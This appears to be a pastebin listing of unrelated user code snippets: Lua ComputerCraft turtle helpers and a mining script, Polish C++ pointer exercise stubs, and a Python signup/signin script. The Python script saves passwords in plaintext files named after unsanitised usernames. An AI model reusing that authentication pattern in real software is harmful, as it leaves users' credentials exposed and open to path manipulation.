        turnright(-count)
    end
    if cb then cb() end
end

function dropAmount(slot, amount)
    if amount == nil then
        return turtle.getItemCount(slot)
    elseif amount < 0 then
        return turtle.getItemCount(slot) + amount
    else return amount
    end
end

function drop(slot, amount)
    amount = dropAmount(slot, amount)
    turtle.select(slot)
    turtle.drop(amount)
end

function dropUp(slot, amount)
    amount = dropAmount(slot, amount)
    turtle.select(slot)
    turtle.dropUp(amount)
end

function dropDown(slot, amount)
    amount = dropAmount(slot, amount)
    turtle.select(slot)
    turtle.dropDown(amount)
end

function compareItems(s1, s2)
    turtle.select(s1)
    return turtle.compareTo(s2)
end

function compareFrontTo(slot)
    turtle.select(slot)
    return turtle.compare()
end

function compareDownTo(slot)
    turtle.select(slot)
    return turtle.compareDown()
end

function compareUpTo(slot)
    turtle.select(slot)
    return turtle.compareUp()
end"
Fk7xcuPE,Untitled,MeehoweCK,C++,Sunday 28th of May 2023 08:11:07 AM CDT,"#include <iostream>
#include <vector>

using namespace std;

void fMaxMin(vector<int*> vec, int* max, int**& min, int** cMax, int& cMin)
{
	int val_max, val_min, val_cMax, val_cMin;

	// miejsce na Twój kod
}

int main()
{
	auto vec = vector<int>{1, 2, 1, 42, 2, 2, 42, 1, 1, 2, 1, 42};
	auto vecP = vector<int*>();
	for (auto& item : vec)
	{
		vecP.push_back(&item);
	}

	int max, min, cMax, cMin;

	int* ptr_min = &min;
	int** ptr2_min = &ptr_min;

	int* ptr_cMax = &cMax;

	fMaxMin(vecP, &max, ptr2_min, &ptr_cMax, cMin);

	cout << ""max: "" << max << endl;
	cout << ""min: "" << min << endl;
	cout << ""cMax: "" << cMax << endl;
	cout << ""cMin: "" << cMin << endl;

	return 0;
}"
9qvqxqFN,mine,pluggeman,Lua,Sunday 28th of May 2023 08:10:46 AM CDT,"os.loadAPI(""robot"")

function init()
    term.write('Neue Position? [j/n]')
    i = read()
    if i == 'j' then
        robot.initGPS()
    elseif i == 'n' then
        robot.load()
    else
        term.clear()
        term.setCursorPos(0, 0)
        init()
    end
end
init()

IGNORE_COUNT = 4

CHUNKS = 1
MIN_HEIGHT = 8
MAX_HEIGHT = 38
Y_STEPS = 3
LAYERS = math.floor((MAX_HEIGHT - MIN_HEIGHT) / Y_STEPS)

STEPS_PER_CHUNK = 16

LENGTH = CHUNKS * STEPS_PER_CHUNK
STEPS = LENGTH - 1

X_START = robot.getX()
Y_START = robot.getY()
Z_START = robot.getZ()
DIR_START = robot.getDirection()

current_layer = 0

moves_per_layer = LENGTH * LENGTH + LENGTH - 2
moves_y = (Y_START - (MAX_HEIGHT - MIN_HEIGHT)) * LAYERS * 2
moves = moves_per_layer * LAYERS + moves_y
fuel_level_start = turtle.getFuelLevel()

function checkDown()
    for i = 1, IGNORE_COUNT do
        if robot.compareDownTo(i) then
            return false
        end
    end
    return true
end

function checkUp()
    for i = 1, IGNORE_COUNT do
        if robot.compareUpTo(i) then
            return false
        end
    end
    return true
end

function compare()
    if checkUp() then turtle.digUp() end
    if checkDown() then turtle.digDown() end
end

function mine()
    for current_layer = 0, LAYERS - 1 do
        
        robot.moveToY(MIN_HEIGHT + current_layer * Y_STEPS)
        
        for i = 1, LENGTH / 2 do
            robot.moveZ(STEPS, compare)
            robot.moveX(1, compare)
            robot.moveZ(-STEPS, compare)

            if i < LENGTH / 2 then
                robot.moveX(1, compare)
            end
            for j = 1, IGNORE_COUNT do
                robot.drop(j, -1)
                for k = IGNORE_COUNT  + 1, 16 do
                    if robot.compareItems(j, k) then
                        robot.drop(k)
                    end
                end
            end
        end

        robot.moveToX(X_START)
        robot.moveToZ(Z_START)
        
        robot.turnTo(DIR_START)

        robot.moveToY(Y_START)

        term.clear()
        term.setCursorPos(1, 1)
        cur_layer = current_layer + 1
        moves_done = fuel_level_start - turtle.getFuelLevel()
        print(""layer ""..cur_layer..""/""..LAYERS)
        print(moves_done..""/""..moves.."" moves"")

        for j = IGNORE_COUNT+1, 16 do
            robot.drop(j)
        end
    end
end

term.clear()
term.setCursorPos(1, 1)
print(""Total moves: "" .. moves)
print(""Fuel: "" .. fuel_level_start)
fuel = fuel_level_start - moves

if fuel < 0 then
    fuel = math.abs(fuel)
    coal_needed = math.ceil(fuel/80)
    print(""Not enough fuel - ""..fuel.."" fuel needed. (""..coal_needed.."" coal)"")
else
    os.sleep(3)
    mine()
end"
JdCaYHjQ,signup1.py,DrAungWinHtut,Python,Sunday 28th of May 2023 08:08:57 AM CDT,"import os


def Signup():
    while True:
        uname = input('Username: ')
        fname = uname + '.dat'
        if ' ' in uname:
            print('SPACE in username, pls try again!')
            continue
        else:
            if os.path.exists(fname):
                print(f'username {uname} already exists, pls try again!')
                continue
            else:
                # Username OK
                break

    while True:
        password = input('Password: ')
        confirm_password = input('Confirm Password: ')
        if password == confirm_password:
            # password OK
            break
        else:
            print('Passwords do not match, pls try again')
            continue

    # Saving password in username.dat file
    file = open(fname, 'w')
    file.write(password)
    file.close()
    print('Signup Successfully...')


def Signin():
    while True:
        uname = input('Username: ')
        password = input('Password: ')
        fname = uname + '.dat'

        if os.path.exists(fname):
            # Username OK
            file = open(fname, 'r')
            password_in_file = file.read().rstrip()  # to remove Enter key \n
            file.close()
            if password == password_in_file:
                print('Signin Successfully....')
                # Main Code here
                break
            else:
                print('Wrong password...')
                ans = input('Exit or Continue? (e\\c)')
                if ans == 'e':
                    exit()
                else:
                    continue

        else:
            print(f'Username {uname} does not exists, pls try again')
            continue


# Program Start Here
# Signup()
Signin()
"
HkjeBasS,Untitled,MeehoweCK,C++,Sunday 28th of May 2023 08:04:18 AM CDT,"#include <iostream>
#include <vector>

using namespace std;

void fMaxMin(vector<int*> vec, int* max, int**& min, int** cMax, int& cMin)
{
	// miejsce na kod funkcji
}

int main()
{
	auto vec = vector<int>{1, 2, 1, 42, 2, 2, 42, 1, 1, 2, 1, 42};
	auto vecP = vector<int*>();
	for (auto& item : vec)
	{
		vecP.push_back(&item);
	}

	int max, min, cMax, cMin;

	// miejsce na wywołanie funkcji

	cout << ""max: "" << max << endl;
	cout << ""min: "" << min << endl;
	cout << ""cMax: "" << cMax << endl;
	cout << ""cMin: "" << cMin << endl;

	return 0;
}"
